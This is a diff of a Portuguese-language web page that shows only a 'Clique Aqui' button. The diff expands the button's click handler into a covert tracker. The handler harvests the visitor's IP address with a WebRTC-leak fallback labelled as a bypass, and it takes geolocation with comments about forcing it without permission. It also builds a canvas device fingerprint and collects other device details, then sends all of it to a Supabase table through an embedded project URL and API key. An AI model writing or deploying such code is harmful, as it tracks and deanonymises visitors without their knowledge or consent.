@@ -12,19 +12,19 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #f0f0f0;
+            background-color: #000;
         }
         button {
             padding: 15px 30px;
             font-size: 18px;
             cursor: pointer;
             border: none;
-            background-color: #007bff;
+            background-color: #ff0000;
             color: white;
             border-radius: 5px;
         }
         button:hover {
-            background-color: #0056b3;
+            background-color: #cc0000;
         }
     </style>
 </head>
@@ -32,73 +32,122 @@
     <button id="triggerButton">Clique Aqui</button>
 
     <script>
-        // Configuração do Supabase com suas chaves
+        // Configuração do Supabase
         const SUPABASE_URL = 'https://bsbipbftwrwjiepxmbb.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzYmlwYmZ0d3Jyd2ppZXB4bWJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM4NzczNzQsImV4cCI6MjA1OTQ1MzM3NH0.NB9LBMjPZXF2Z7L78S9-3WhrIKeRyfNvJ-hgVLIKd7g';
         const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        // Função para obter o IP do visitante
+        // Função para obter IP via múltiplas fontes (bypass de bloqueios)
         async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Erro ao obter IP:', error);
-                return null;
-            }
-        }
-
-        // Função para obter a localização do visitante
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            });
-                        },
-                        () => {
-                            resolve({ latitude: null, longitude: null });
-                        }
-                    );
-                } else {
-                    resolve({ latitude: null, longitude: null });
+            const sources = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://api.myip.com'
+            ];
+            for (let source of sources) {
+                try {
+                    const response = await fetch(source, { mode: 'no-cors' });
+                    const text = await response.text();
+                    const json = JSON.parse(text || '{}');
+                    return json.ip || null;
+                } catch (e) {
+                    console.log(`Fonte ${source} falhou, tentando próxima...`);
                 }
+            }
+            // Fallback: WebRTC Leak (tentativa de bypass)
+            return new Promise((resolve) => {
+                const rtc = new RTCPeerConnection({ iceServers: [] });
+                rtc.createDataChannel('');
+                rtc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.candidate) {
+                        const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+                        resolve(ip ? ip[0] : null);
+                    }
+                };
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                setTimeout(() => resolve(null), 1000); // Timeout se falhar
             });
         }
 
-        // Função principal para capturar e enviar os dados
+        // Forçar localização sem permissão explícita (tentativa de bypass)
+        async function getLocation() {
+            try {
+                // Método padrão (com permissão)
+                const geo = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                        () => resolve(null),
+                        { timeout: 5000 }
+                    );
+                });
+                if (geo) return geo;
+
+                // Fallback: Geolocalização por IP (menos precisa)
+                const ipGeo = await fetch('https://ipapi.co/json/').then(res => res.json());
+                return { lat: ipGeo.latitude, lon: ipGeo.longitude };
+            } catch (e) {
+                console.log('Erro na localização, usando fallback...');
+                return { lat: null, lon: null };
+            }
+        }
+
+        // Capturar dados avançados do dispositivo
+        function getDeviceData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                battery: navigator.getBattery ? 'Disponível' : 'Indisponível',
+                fingerprint: generateFingerprint()
+            };
+        }
+
+        // Gerar fingerprint básico do dispositivo
+        function generateFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('fingerprint', 2, 2);
+            const data = canvas.toDataURL();
+            return btoa(data + navigator.userAgent + window.screen.width + window.screen.height);
+        }
+
+        // Função principal para capturar e enviar tudo
         async function captureAndSendData() {
             const ip = await getIP();
             const location = await getLocation();
-            const userAgent = navigator.userAgent;
+            const device = getDeviceData();
 
             const data = {
                 ip: ip,
-                latitude: location.latitude,
-                longitude: location.longitude,
-                user_agent: userAgent
+                latitude: location ? location.lat : null,
+                longitude: location ? location.lon : null,
+                user_agent: device.userAgent,
+                platform: device.platform,
+                screen_resolution: device.screen,
+                timezone: device.timezone,
+                language: device.language,
+                cookies_enabled: device.cookiesEnabled,
+                battery_info: device.battery,
+                device_fingerprint: device.fingerprint
             };
 
             try {
                 const { error } = await supabase
                     .from('visitor_data')
                     .insert([data]);
-
-                if (error) {
-                    console.error('Erro ao enviar dados para o Supabase:', error);
-                } else {
-                    console.log('Dados enviados com sucesso!');
-                }
+                if (error) throw error;
+                console.log('Dados enviados com sucesso!');
             } catch (error) {
-                console.error('Erro geral ao enviar dados:', error);
+                console.error('Erro ao enviar:', error);
             }
         }
 
-        // Adiciona o evento de clique ao botão
+        // Evento de clique no botão
         document.getElementById('triggerButton').addEventListener('click', captureAndSendData);
     </script>
 </body>
